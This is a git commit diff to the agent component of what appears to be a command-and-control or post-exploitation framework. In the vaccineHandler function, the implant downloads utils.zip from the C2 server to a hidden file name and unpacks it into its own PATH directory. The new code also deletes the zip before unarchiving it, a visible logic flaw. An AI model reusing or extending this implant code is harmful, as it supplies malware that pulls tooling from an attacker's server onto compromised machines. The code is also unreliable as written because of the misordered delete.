f9a69ac8326947d0fba2d711540694d5ad04f423
jm33-m0 <jm33.m0@gmail.com>
2021-01-09 16:02:24 +0800

    randomize vaccine download path

--- core/internal/agent/vaccine.go
+++ core/internal/agent/vaccine.go
@@ -13,21 +13,22 @@ import (
 
 func vaccineHandler() string {
 	log.Printf("Downloading utils.zip from %s", CCAddress+"utils.zip")
-	err := DownloadViaCC(CCAddress+"utils.zip", "/tmp/.vj8x8Verd.zip")
+	err := DownloadViaCC(CCAddress+"utils.zip", AgentRoot+"/.vj8x8Verd.zip")
 	out := "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
 		out = "[-] Download error: " + err.Error()
 	}
+	_ = os.Remove(AgentRoot + "/.vj8x8Verd.zip")
 
-	// TODO unpack utils.zip to our PATH
+	// unpack utils.zip to our PATH
 	if !IsFileExist(UtilsPath) {
 		if err = os.MkdirAll(UtilsPath, 0700); err != nil {
 			log.Print(err)
 			return err.Error()
 		}
 	}
-	if err = archiver.Unarchive("/tmp/.vj8x8Verd.zip", UtilsPath); err != nil {
+	if err = archiver.Unarchive(AgentRoot+"/.vj8x8Verd.zip", UtilsPath); err != nil {
 		log.Printf("Unarchive: %v", err)
 	}
 	return out
